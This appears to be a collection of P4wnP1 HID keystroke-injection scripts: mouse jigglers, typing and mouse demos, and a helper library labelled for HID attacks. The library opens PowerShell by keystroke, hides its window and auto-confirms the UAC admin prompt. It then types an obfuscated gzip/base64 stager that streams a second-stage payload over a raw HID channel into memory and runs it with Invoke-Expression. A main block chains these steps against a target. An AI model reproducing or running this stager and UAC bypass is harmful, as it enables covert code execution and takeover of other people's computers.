// Creds to Rogan Dawes, MouseJiggler idea was part of USaBUSe
//
// Moves the mouse slightly from time, to simulate user activity (supress screensaver/lockscreen)
// Meant to run as background job
// With extrem settings, it could be use to prank users

scale = 2.0; //if not stepped, 127 is vali max
sleeptime = 30;
stepped = true;
while (true) {
	x = (Math.random() * 2.0 - 1.0) * scale;
	y = (Math.random() * 2.0 - 1.0) * scale;
	if (stepped) moveStepped(x,y);
	else move(x,y);
	delay(sleeptime);
}


//Log something to internal console
console.log("HID testscript");

layout("US"); //set US layout

//Natural typing speed (100 ms between keys + additional jitter up to 200 ms)
typingSpeed(100,200);
type("Typing in natural speed");

layout("DE"); //Switching language layout, while script still running

//Fastest typing speed (no delays)
typingSpeed(0,0);
type("Typing fast, including  unicode: üÜöÖäÄ");

//Do some relative mouse movement
for (var i = 0; i<10; i++) {
    x = Math.random() * 256 - 128; //x, scaled between -128 and 127
    y = Math.random() * 256 - 128; //y, scaled between -128 and 127
    move(x,y);
    delay(500); //wait a half a second
}

//Do some relative mouse movement, but devide it into 1 DPI substeps (pixel perfect mouse move, but slow)
for (var i = 0; i<10; i++) {
    x = Math.random() * 256 - 128; //x, scaled between -128 and 127
    y = Math.random() * 256 - 128; //y, scaled between -128 and 127
    moveStepped(x,y);
    delay(500); //wait a half a second
}

//Do some absolute Mouse positioning (not stepped, mouse moves immediately, thus delays are added)
moveTo(0.2,0.2);
delay(1000);
moveTo(0.8,0.2);
delay(1000);
moveTo(0.8,0.8);
delay(1000);
moveTo(0.2,0.8);
delay(1000);

//press button 1, move mouse stepped, release button 1
console.log("Moving mouse with button 1 pressed");
button(BT1);
moveStepped(20,0);
button(BTNONE);
delay(500);

//Click button 2
console.log("Click button 2");
click(BT2);

//Doubleclick button 1
console.log("Double click button 2");
doubleClick(BT1);

/*
Common helper methods for HID attacks
author: MaMe82
*/

ps_wow64='%SystemRoot%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe'
ps="powershell.exe"

// sets typing speed to "natural" (global effect on all running script jobs)
function natural() {
  typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)
}

// sets typing speed as fast as possible
function fast() {
  typingSpeed(0,0)
}

// Open an interactive PowerShell console (host architecture)
function startPS() {
	press("GUI r");
	delay(500);
	type("powershell\n")
}

// Hide an already opened PowerShell console, but keep input focus, to gon on typing
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}

// On a powershell prompt, check if the running PS is 32bit, start an inline 32bit PowerShell, otherwise.
function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(500);
}

// Uses search bar and CTRL+SHIFT+ENTER to run given program as admin (assumes user is admin, only confirms UAC dialog)
function win10AsAdmin(program) {
  press("GUI"); //open search
  delay(200);
  type(program); //enter target binary
  delay(500); // wait for search to finish
  press("CTRL SHIFT ENTER"); //start with CTRL+SHIFT+ENTER (run as admin)
  delay(500); //wait for confirmation dialog (no check if a password is required, assume login user is admin)
  press("SHIFT TAB"); //switch to dialog confirmation
  press("ENTER");
}

// Streams PS code via a HID channel into memory and executes the received result with IEX.
// The second stage code has to be provided by hidstager.py.
// PID and VID in used by the raw HID device have to be provided as string arguments in format "1D6B", "4137".
//
// The advantages of delivery via raw HID:
// - the channel allows to transfer large payloads silently (about 32KByte/s on USB 2.0)
// - the payload goes to memory, not to disk
// - combined with hidePS, typing out his stager could be done nearly invisible (2131 characters have to be typed here)
// The disadvantages of delivery via raw HID:
// - the payload is executed with Invoke-Expression (iex) after transfer, which is 'loud' again
// - the PID and VID of the (raw) HID device in use have to be known, in order to allow the stager to identify the device
//   (the stager manages to find the correct interface itself, if multiple HID interfaces, like keyboard and mouse, are up)
function hidDownAndIEX(vid, pid) {
  type("$USB_VID='"+ vid +"';$USB_PID='" + pid +"';");
  type("$b='H4sIAAAAAAAEAKVXbU/bSBD+jsR/sFzfxRGJ5VBaISR0Bwm0kUobNXA9XbDQxh4ne9jeaL1OG/X47zezu7YT2lSqCoLYuzPPPPO6m8ODtCpixUXhfIQ0g1gNJTAF1zyDG1BLkfjdw4OvhwdeInLn3JldrFYjkTNeRGdnw0pKKJR5JxGGEu/hc//D/F9EqhERPLgoS8jn2eY9y8F3b9gNnB6PNkW97KIRj81RnewEI0h5AbjPch7XMj7i95zZFuhVzlWDfFnxLAF5EcdQlkjuY1UQaK5B2XwX80YkVbZNxCy4Pce7ZlkJpKm0Zl5r3m5WjQLKuZNqnvG45wwzVpaaf5xShFDPatj4uW1E3V3+RuBCKcnnlYIyalGniikek/y4UBMlI3wiBrMocv70Z1NUKRaR2X55TA93zVOrcbd/1+lqygmnpGKsFM8hwD2QYjUFueYYxmCUZeN8JaRqOEbBG1BDUZRKVrES0m/JGMCUacDWyWsOWTIuUmGp/6Qtre67V4WSm4nghXK7vZ8mbEEmEkqUhClf/ALKFNQ7VqorKYX8BZghyzIMG8ZyjT2EkfoVrCWTSMu1KUjXOgmmC03Yd4vQu5UVNB97jX5DEdvqEy/Yiv9IyXBB0YtKCUMo3j8YdA8Pq1KJvHHNtrJP5dkj8o8gC8heHgdJllGYqMz0f/TUdl6ANp/B+NqyaeXA+K+bGFeeDtu510YGCxlYfi1FPgJyZsLU0vfyPM7QX1vljrfCVTsTl3pC4D7OwgbF1xJNa4Z/D0PzQ0sfAhJphxSw5JPkCtrGPDv7B+PZyuJkAlz8sIKi7ePwy8kW6LaiHqREixhcCpEBK6KQYnQ+u+GxFKVIVYBZxGhOWQpvWZFkmDZ6JnPm/Xmbl353Fka1xzEmfS0e0VMd3ZSd73eM6JwTGY9SZmPy+mSL3MCQswgmB9+zPzhBAhJUJYvnFLbTWUKRPCRMMd9LEQ8Nl6KSMT0kUCr6wE38kBADX0Nic8nPKUrzDc7h3WK9xKVZ5PivX3VrgZnHj44i6jF6jZxw34a1vXebGO3fRJ7BOygWarlXpnZCn74oPhSrza3wjTQ6yYlzAmsKRaAT0uxh6ZhHa+NZHDEN23G0UZI/ik0s9QFurVEJ+J7shT2zawIsgabYA09IVBp/cLmU8e5CUqpnEsUzFRmvdxfycvF9dqSLDGYXUrIN3VswSMQMw4N/qGaCYaTqCkNGVCu6YnCHCiZeG/HdQGGlbo+Lu+nlw1/jEUrS02Q8spF7Ox69qXhy7n49SQbw6tX8uJ8OXqf9wSBO+6en8bwfhgP8oaZ+GT65aEFgDuIl8v+cc4yqwwtngY+O7t4HhMcOUVJkGUjDwPnvt68zlIh87wEvITgyEhzc3Sen6yAFnjZQgZEfj5x+zhTZcGvirnPkdH5H3g8dfHJrL9yu08fR4OwF6KCDHSvUL4RqJO3JoClQcdB0xDy59/d/3JOxWm7yflKDYu2sMhaD37nv9DovEBaZvNDCNow6BU8toHmhUYzQe26yKECi57sZc2rHm4S1HYNYPz4dzPQ3ZwI1gMBDEZX6NNNKxRZwTJ5iLj3IV2rz/fIMsULwdqPL5POSzPpNE+2OZQwsOF5RZZkpqmbWNV3nhPhrjYXa4fgRiFLTzo2oLQgjgdNdg4cGOMbC4kUFOqzbYoP9Yl6l0lMaTbfwRQVXRSwSOjDPzu5ur09pnpsTtIE6iboWmxQDvPFKVX7i2EMuubUEfJ9j8OvK8214+wuF9g2BObr12JL8BmgOC15sQ9lmrBOFIZrRMYMnEd1taD6+w5s7XvIIxDHTFUk7JpmumZGA3xC0vZpQE5A66Uc4mIhMYwoXBt/a8t3AQj7tI2IB0U/zPQcS0uDwxbG2zDDCW1mWbew3NVs7w0yU+rbTrIx4ubJrqHR48D9inn4F/g0AAA==';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()");
  press("ENTER");
}

layout('de');			// US keyboard layout
fast();

startPS();
delay(500);
assurePS32();
delay(500);
//hidePS();
//delay(500);
hidDownAndIEX("1D6B", "1347");

// Creds to Rogan Dawes, MouseJiggler idea was part of USaBUSe
//
// Moves the mouse slightly from time, to simulate user activity (supress screensaver/lockscreen)
// Meant to run as background job
// With extrem settings, it could be use to prank users

scale = 2.0; //if not stepped, 127 is vali max
sleeptime = 3000;
stepped = true;
while (true) {
	x = (Math.random() * 2.0 - 1.0) * scale;
	y = (Math.random() * 2.0 - 1.0) * scale;
	if (stepped) moveStepped(x,y);
	else move(x,y);
	delay(sleeptime);
}


layout('us');			// US keyboard layout
typingSpeed(100,150)	// Wait 100ms between key strokes + an additional random value between 0ms and 150ms (natural)

waitLEDRepeat(NUM);		// Wait till NUM LED of target changes frequently multiple times (doesn't work on OSX)
press("GUI r");
delay(500);
type("notepad\n")
delay(1000);
for (var i = 0; i < 3; i++) {
  type("Hello from P4wnP1 run " + i + " !\n");
  type("Moving mouse right ...");
  moveStepped(500,0);
  type("and left\n");
  moveStepped(-500,0);
}
type("Let's type fast !!!!!!!!!!!!!!!\n")
typingSpeed(0,0);
for (var i = 3; i < 10; i++) {
  type("Hello from P4wnP1 run " + i + " !\n");
  type("Moving mouse right ...");
  moveStepped(500,0);
  type("and left\n");
  moveStepped(-500,0);
}